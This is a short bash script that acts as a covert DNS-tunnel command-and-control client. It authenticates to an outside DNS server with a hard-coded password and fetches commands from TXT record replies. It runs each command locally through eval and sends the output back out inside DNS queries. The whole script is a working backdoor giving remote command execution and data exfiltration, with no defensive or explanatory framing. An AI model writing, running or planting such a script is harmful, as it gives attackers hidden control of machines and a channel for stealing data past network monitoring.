#!/bin/bash

DNS_SERVER="1.2.3.49"  # Replace with your DNS server's IP
DOMAIN="your.domain"
PASSWORD="my_secure_password"

# Function to send a DNS query and get the response
function send_dns_query() {
    local query="$1"
    dig +short @$DNS_SERVER "$query.$DOMAIN" TXT | sed 's/"//g'
}

# Authenticate to the DNS server
auth_response=$(send_dns_query "$PASSWORD")

if [[ $auth_response == *"Authenticated"* ]]; then
    while true; do
        # Send 'ready' query to server and receive a command
        command=$(send_dns_query "ready")

        if [[ $command == "No command yet" ]]; then
            sleep 2
            continue
        fi

        # Execute the received command locally on the client
        output=$(eval "$command")
        
        # Send the output back to the server
        send_dns_query "$output"

        # Delay before checking for the next command
        sleep 2
    done
else
    echo "Authentication failed."
fi
